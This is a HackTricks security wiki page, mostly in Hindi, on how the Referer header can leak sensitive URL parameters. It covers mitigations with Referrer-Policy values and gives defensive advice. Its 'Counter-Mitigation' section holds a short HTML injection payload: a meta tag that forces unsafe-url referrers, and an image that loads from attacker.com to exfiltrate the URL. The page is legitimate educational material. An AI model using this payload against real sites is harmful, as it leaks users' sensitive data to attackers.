{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Referrer headers and policy

Referrer वह हेडर है जिसका उपयोग ब्राउज़रों द्वारा यह संकेत करने के लिए किया जाता है कि कौन सा पिछला पृष्ठ देखा गया था।

## संवेदनशील जानकारी लीक

यदि किसी समय एक वेब पृष्ठ के अंदर कोई संवेदनशील जानकारी GET अनुरोध पैरामीटर पर स्थित है, यदि पृष्ठ में बाहरी स्रोतों के लिए लिंक हैं या एक हमलावर उपयोगकर्ता को एक URL पर जाने के लिए मजबूर/सुझाव देने में सक्षम है जो हमलावर द्वारा नियंत्रित है। यह नवीनतम GET अनुरोध के अंदर संवेदनशील जानकारी को निकालने में सक्षम हो सकता है।

## शमन

आप ब्राउज़र को एक **Referrer-policy** का पालन करने के लिए कह सकते हैं जो **संवेदनशील जानकारी** को अन्य वेब अनुप्रयोगों में भेजने से **रोक** सकती है:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Counter-Mitigation

आप इस नियम को एक HTML मेटा टैग का उपयोग करके ओवरराइड कर सकते हैं (हमलावर को एक HTML इंजेक्शन का लाभ उठाने की आवश्यकता है):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defense

कभी भी किसी संवेदनशील डेटा को GET पैरामीटर या URL में पथ के अंदर न रखें।


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
